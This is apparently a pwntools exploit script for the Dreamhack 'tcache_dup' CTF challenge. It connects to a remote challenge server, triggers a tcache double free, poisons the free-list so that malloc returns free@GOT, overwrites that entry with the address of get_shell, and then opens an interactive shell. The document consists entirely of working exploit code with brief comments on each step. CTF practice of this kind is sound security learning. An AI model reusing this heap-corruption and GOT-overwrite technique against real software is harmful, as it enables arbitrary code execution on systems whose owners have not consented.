from pwn import *

r = remote("host8.dreamhack.games", 22549)
libc = ELF("/mnt/c/Users/Storm/ctf/libc-2.27.so")
e = ELF("/mnt/c/Users/Storm/ctf/tcache_dup")

free = e.got['free']
get_shell = e.symbols['get_shell']

def create(size, data):
    r.sendlineafter("> ", str(1))
    r.sendlineafter(b': ', str(size).encode())
    r.sendafter(b': ', data)

def delete(idx):
    r.sendlineafter("> ", str(2))
    r.sendlineafter(b': ', str(idx).encode())

# trigger double free bug
create(0x10, b'AAAAAAAA')
delete(0)
delete(0)

create(0x10, p64(free))     #change fd to free@GOT
create(0x10, b'BBBBBBBB')   #malloc returns free@GOT
create(0x10, p64(get_shell))    #overwrite get_shell at free@GOT

delete(0)

r.interactive()